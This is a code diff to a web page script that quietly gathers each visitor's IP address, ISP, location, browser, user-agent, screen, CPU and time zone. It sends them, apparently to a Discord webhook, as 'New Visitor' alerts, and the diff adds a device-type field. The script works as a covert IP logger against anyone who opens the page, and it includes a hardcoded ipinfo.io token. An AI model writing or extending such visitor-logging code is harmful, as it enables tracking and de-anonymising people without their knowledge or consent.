@@ -26,6 +26,9 @@
   // Get screen resolution
   const screenRes = `${screen.width}x${screen.height}`;
 
+  // Device type by your rule: ≤ 768px = Phone, > 768px = PC
+  const deviceType = window.innerWidth <= 768 ? "Phone" : "PC";
+
   // Get CPU cores
   const cpuCores = navigator.hardwareConcurrency || "Unknown";
 
@@ -35,8 +38,8 @@
   // Get time zone
   const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
 
-  // Fetch IP and ISP info using ipinfo.io
-  fetch('https://ipinfo.io/json?token=6ed2b2fac88455') // Replace YOUR_TOKEN_HERE with free token from ipinfo.io
+  // Fetch IP and ISP info using ipinfo.io (FIXED URL QUOTE)
+  fetch("https://ipinfo.io/json?token=6ed2b2fac88455") // Replace YOUR_TOKEN_HERE with your token
     .then(res => res.json())
     .then(data => {
       const ip = data.ip || "Unknown";
@@ -53,11 +56,12 @@
           embeds: [
             {
               title: "🆕 New Visitor",
-              color: 3447003, // Blue color
+              color: 3447003,
               fields: [
                 { name: "IP Address", value: ip, inline: true },
                 { name: "ISP / Org", value: isp, inline: true },
                 { name: "Location", value: location, inline: true },
+                { name: "Device Type", value: deviceType, inline: true },
                 { name: "Browser", value: browserInfo, inline: true },
                 { name: "User-Agent", value: userAgent, inline: false },
                 { name: "Screen Resolution", value: screenRes, inline: true },
@@ -75,6 +79,7 @@
       console.error("Error sending data:", err);
     });
 </script>
+
 
 
 </head>
